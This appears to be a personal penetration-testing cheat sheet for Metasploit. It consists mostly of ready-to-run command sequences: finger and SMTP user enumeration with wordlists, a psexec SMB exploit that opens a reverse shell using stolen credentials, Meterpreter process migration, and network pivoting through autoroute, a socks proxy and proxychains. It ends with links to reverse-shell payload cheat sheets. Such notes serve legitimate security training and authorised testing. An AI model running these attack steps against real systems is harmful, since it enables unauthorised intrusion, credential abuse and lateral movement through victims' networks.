# Nmap Scan with Metasploit

This will perform a nmap scan and feed the results into Metasploit.
```bash
msfconsole
db_nmap
```

# Finger
##### Enumerate Users with Finger
```bash
msfconsole -q
search finger
use auxiliary/scanner/finger/finger_users
use 1
show options

set RHOSTS <SMTP Host>
set USERS_FILE <Wordlist>
run
```

# SMB
##### Establish Reverse Shell with SMB
```bash
msfconsole
use exploit/windows/smb/psexec
set RHOSTS <Target Host>
set SMBUser <Username>
set SMBPass <Password>
exploit
```

# SMTP
### Enumerate SMTP Users
```bash
msfconsole -q
search smtp_enum

use auxiliary/scanner/smtp/smtp_enum
# or
use 0
show options

set RHOSTS <SMTP Host>
set USER_FILE <Wordlist>
run
```

# Meterpreter
### Migrate to Another Process By Name
```bash
migrate -N <Process Name>.<Extension>
```
### Pivot With Meterpreter and Proxychains
```bash
# Establish meterpreter session
# Background meterpreter
background
use post/multi/manage/autoroute
show options
set SESSION <meterpreter session #>
set NETMASK <Netmask of NIC on exploited target>
run

cat /etc/proxychains4.conf

use auxiliary/server/socks_proxy
show options
SRVPORT = 1080
VERSION = 5
set SRVPORT 9050 # Change port to match /etc/proxychains4.conf
set VERSION 4a # Does not work with version 5.  Must be 4a.
run
jobs

# Run nmap scan
proxychains nmap -sV -sT -Pn -sC -p<Port #> <Target Host>
# Exploited target with SMB.  Therefore, -p must be 445.
```
##### [Pivoting attack traffic](https://www.youtube.com/watch?v=Wn59J8PiIl0)
##### [84 post exploitation pivoting autoroute](https://www.youtube.com/watch?v=jjUamstPDWo)
##### [Multi Manage Network Route via Meterpreter Session - Metasploit](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/autoroute)

# Cheatsheets
[MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter)](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

# References
[Deep Dive Into Stageless Meterpreter Payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)

[Metasploit Module Library](https://www.infosecmatter.com/metasploit-module-library/)